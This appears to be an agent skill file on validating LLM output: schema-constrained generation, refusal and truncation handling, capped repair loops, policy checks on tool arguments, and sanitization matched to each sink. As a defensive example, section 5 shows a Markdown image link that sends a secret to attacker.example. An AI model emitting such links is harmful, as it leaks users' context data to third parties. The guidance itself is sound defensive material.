---
name: llm-output-validation
description: Make model output safe to consume programmatically — schema-constrained generation, tool-call argument validation, bounded repair and retry loops, detecting refusals and truncation, and treating model text as untrusted before it reaches a sink. Use when the user asks about structured output, JSON parsing failures from an LLM, function-call validation, Zod/Pydantic schemas for model responses, or retry logic around a model call.
metadata:
  origin: FORGE
---

# LLM Output Validation

A model returns a string. Everything downstream — a database write, a tool invocation, a
rendered page — treats it as data. The gap between those two facts is where production
LLM systems break: a truncated JSON object, a tool argument that names a path outside
the sandbox, a refusal parsed as an empty result, a Markdown link that becomes an
exfiltration channel. This skill closes the gap with a validation boundary that fails
loudly. Done means: no model output reaches a side effect without passing a schema and
a policy check, and every rejection is counted.

## When to activate

- Parsing JSON, YAML, or a structured record out of a model response
- Implementing tool or function calling where the model supplies arguments
- A pipeline intermittently crashes on malformed model output
- Model responses feed a database, a shell command, an HTTP request, or the DOM
- Adding retries around a model call, or deciding when to stop retrying
- User says "structured output", "JSON mode", "the model returned invalid JSON",
  "function calling validation", "Zod schema for the response", "retry the model"

## When NOT to use

- Guarding against instructions embedded in input the model reads — that is
  [prompt-injection-defense](../prompt-injection-defense/SKILL.md); this skill covers
  the output side and the two are used together
- Measuring answer quality across a test set — use
  [model-evaluation-harness](../model-evaluation-harness/SKILL.md)
- Cost and model-tier routing — use
  [cost-aware-llm-pipeline](../cost-aware-llm-pipeline/SKILL.md)
- Retrieval quality problems that look like bad answers — use
  [rag-architecture](../rag-architecture/SKILL.md)

## Prerequisites

- A schema library that produces machine-readable errors: `zod` (TypeScript),
  `pydantic` (Python), or JSON Schema with a validator such as `ajv`
- Knowledge of whether the provider supports constrained decoding or a strict tool
  schema, which removes most parse failures at the source
- A metrics sink; validation is only useful if failures are counted

## Process

### 1. Constrain generation before validating it

Post-hoc parsing is the fallback, not the plan. Where the provider supports a strict
schema, the decoder cannot emit a violating token and the failure class disappears.

```ts
import { z } from "zod";
import { zodToJsonSchema } from "zod-to-json-schema";

const Extraction = z.object({
  vendor: z.string().min(1).max(200),
  invoice_number: z.string().regex(/^[A-Z0-9-]{3,32}$/),
  total_cents: z.number().int().nonnegative().max(100_000_00),
  currency: z.enum(["USD", "EUR", "GBP", "PHP"]),
  line_items: z.array(z.object({
    description: z.string().max(500),
    amount_cents: z.number().int(),
  })).max(200),
  confidence: z.enum(["high", "medium", "low"]),
});

const tool = {
  name: "record_invoice",
  description: "Record one parsed invoice. Call exactly once.",
  input_schema: zodToJsonSchema(Extraction, { target: "openApi3" }),
};
```

Schema design rules that matter more than the library:

- Enums over free strings for anything that will be branched on.
- Bounds on every number and length limits on every string and array. An unbounded
  array is a denial-of-service on your own serializer.
- No free-form `object` or `any`. A field you cannot describe is a field you cannot
  validate.
- An explicit `unknown` or `not_found` member in every enum, so the model has a legal
  way to express uncertainty instead of inventing a value.
- Optional fields need a stated default. `undefined` and `null` reaching a writer are
  bugs waiting for a slow day.

### 2. Detect refusal, truncation, and empty completion before parsing

These three are the failure modes a JSON parser reports misleadingly.

```ts
type Outcome =
  | { kind: "ok"; text: string }
  | { kind: "truncated" }
  | { kind: "refused"; reason: string }
  | { kind: "empty" };

function classify(resp: ModelResponse): Outcome {
  if (resp.stop_reason === "max_tokens") return { kind: "truncated" };
  if (resp.stop_reason === "refusal") return { kind: "refused", reason: resp.text ?? "" };
  const text = resp.content.filter(b => b.type === "text").map(b => b.text).join("").trim();
  if (!text) return { kind: "empty" };
  return { kind: "ok", text };
}
```

Each outcome takes a different action. Truncation is retried with a higher output cap or
a smaller unit of work — never repaired, because the tail is genuinely absent. A refusal
is surfaced to the caller and logged; retrying it with the same input mostly produces the
same refusal and burns budget. An empty completion after a tool-heavy turn usually means
the model expected a tool result it never received.

### 3. Validate, then repair once, then fail

Unbounded repair loops turn one bad response into an unbounded bill.

```ts
const MAX_REPAIRS = 1;

async function extractInvoice(doc: string) {
  let messages = [{ role: "user" as const, content: buildPrompt(doc) }];

  for (let attempt = 0; attempt <= MAX_REPAIRS; attempt++) {
    const resp = await model.call({ messages, tools: [tool], tool_choice: { name: tool.name } });
    const call = resp.content.find(b => b.type === "tool_use");
    if (!call) {
      metrics.increment("llm.no_tool_call");
      throw new OutputError("model produced no tool call");
    }

    const parsed = Extraction.safeParse(call.input);
    if (parsed.success) {
      metrics.increment("llm.valid", { attempt });
      return parsed.data;
    }

    metrics.increment("llm.schema_invalid", { attempt });
    if (attempt === MAX_REPAIRS) break;

    // Feed back only the machine-readable errors, never a free-form scolding.
    messages = [
      ...messages,
      { role: "assistant", content: resp.content },
      { role: "user", content:
        "The tool input failed validation. Correct these fields and call the tool again.\n" +
        JSON.stringify(parsed.error.issues.map(i => ({ path: i.path, message: i.message }))) },
    ];
  }

  throw new OutputError("schema validation failed after repair");
}
```

Two disciplines around this loop:

- Distinguish a *retry* (same request, transient failure such as a 429, timeout, or
  overload — use exponential backoff with jitter) from a *repair* (new request carrying
  the validation error). Retries can be several; repairs get one, at most two.
- If the schema-invalid rate exceeds a few percent, the schema or the prompt is wrong.
  Repair loops are masking a defect, at full token price each time.

### 4. Validate tool arguments against policy, not only against types

A well-typed argument can still be a dangerous one. Type checking says `path` is a
string; policy says which strings are allowed.

```python
from pathlib import Path

WORKSPACE = Path("/srv/workspace").resolve()
ALLOWED_HOSTS = {"api.example.com", "docs.example.com"}

def check_read_file(args: dict) -> Path:
    target = (WORKSPACE / args["path"]).resolve()
    if not target.is_relative_to(WORKSPACE):     # blocks ../ and absolute paths
        raise PolicyError("path escapes the workspace")
    if target.is_symlink():
        raise PolicyError("symlinks are not followed")
    return target

def check_http_get(args: dict) -> str:
    from urllib.parse import urlparse
    u = urlparse(args["url"])
    if u.scheme != "https" or u.hostname not in ALLOWED_HOSTS:
        raise PolicyError(f"host not permitted: {u.hostname}")
    return u.geturl()
```

Checks worth writing for every tool surface: path containment after resolution, URL
scheme and host allowlist (which also covers link-metadata and SSRF paths), SQL
restricted to parameterized statements against an allowlisted set of tables, amount and
quantity ceilings on anything financial, and a hard cap on tool calls per turn.

Confirmation gates belong on irreversible actions — delete, transfer, send, publish —
regardless of how confident the model sounded. Argument validation runs server-side; a
check inside the prompt is a suggestion.

### 5. Sanitize at the sink, matched to that sink

Model output is untrusted input for whatever consumes it, and the correct escaping
depends on the destination.

| Destination | Risk | Control |
| --- | --- | --- |
| HTML page | Script injection via generated markup | Render as text, or sanitize with an allowlist (DOMPurify); never `dangerouslySetInnerHTML` on raw output |
| Markdown renderer | Image and link URLs used to exfiltrate context | Allowlist link schemes and hosts; block auto-loading remote images |
| Shell | Command injection | Never build a command string; pass an argv array with no shell |
| SQL | Injection | Parameterized statements only; the model supplies values, never fragments |
| Another model's prompt | Instruction propagation | Delimit and label as untrusted — see [prompt-injection-defense](../prompt-injection-defense/SKILL.md) |
| Log or terminal | ANSI escapes, spoofed log lines | Strip control characters and newlines before writing |

The Markdown case is the one most often missed. A model that has read untrusted content
can emit `![x](https://attacker.example/?d=<secret>)`, and a renderer that fetches
images turns generated text into a data channel.

### 6. Instrument the boundary

Emit a counter for each: valid on first attempt, valid after repair, schema-invalid
final, no tool call, truncated, refused, policy-rejected. Sample and store the raw
response for every failure — the fix almost always requires reading the actual text,
and by the time someone looks the request is long gone.

Alert on rate changes rather than absolute counts. A schema-invalid rate that triples
after a model version change is the signal; the raw number is noise.

## Checklist

- [ ] Every structured output has a schema with enums, bounds, and length limits
- [ ] Constrained decoding or strict tool schemas used where the provider offers them
- [ ] Every enum includes a legal "unknown" member
- [ ] Refusal, truncation, and empty completion classified before parsing
- [ ] Repairs capped at one or two; transient retries use backoff with jitter
- [ ] Repair prompt carries machine-readable validation errors only
- [ ] Tool arguments validated against policy (paths, hosts, amounts) server-side
- [ ] Irreversible actions require confirmation regardless of model confidence
- [ ] Output sanitized for the specific sink; no raw HTML rendering
- [ ] Markdown link and image URLs restricted to an allowlist
- [ ] Shell invocations use argv arrays, never interpolated strings
- [ ] Validation outcomes counted; failed raw responses sampled and retained
- [ ] Fallback path exists for permanent validation failure — no silent empty result

## Failure modes

| Symptom | Likely cause | Fix |
| --- | --- | --- |
| JSON parse error on long outputs | Hit the output token cap | Detect `max_tokens`; raise the cap or split the work |
| Retry loop runs until the budget is gone | No repair cap, or retrying refusals | Cap repairs; classify refusal as terminal |
| Enum field contains an unexpected value | Free string instead of an enum | Tighten the schema; add an `unknown` member |
| Path traversal reached the filesystem | Type validation only, no containment check | Resolve and assert containment before use |
| Rendered answer executes script | Raw output injected as HTML | Render as text or sanitize with an allowlist |
| Secrets leave via a generated image URL | Markdown renderer fetches remote images | Allowlist hosts; disable remote image loading |
| Downstream sees empty results, no error | Validation failure swallowed | Fail loudly; count it; return an explicit error |
| Failures spike after a model upgrade | Prompt was tuned to the old model's formatting | Pin the model version; re-run the eval set before rollout |

## References

- JSON Schema validation vocabulary; `zod` and `pydantic` documentation
- OWASP Top 10 for LLM Applications: insecure output handling, excessive agency
- Provider documentation for strict tool schemas and stop reasons
- [prompt-injection-defense](../prompt-injection-defense/SKILL.md),
  [model-evaluation-harness](../model-evaluation-harness/SKILL.md),
  [rag-architecture](../rag-architecture/SKILL.md),
  [error-handling](../error-handling/SKILL.md)
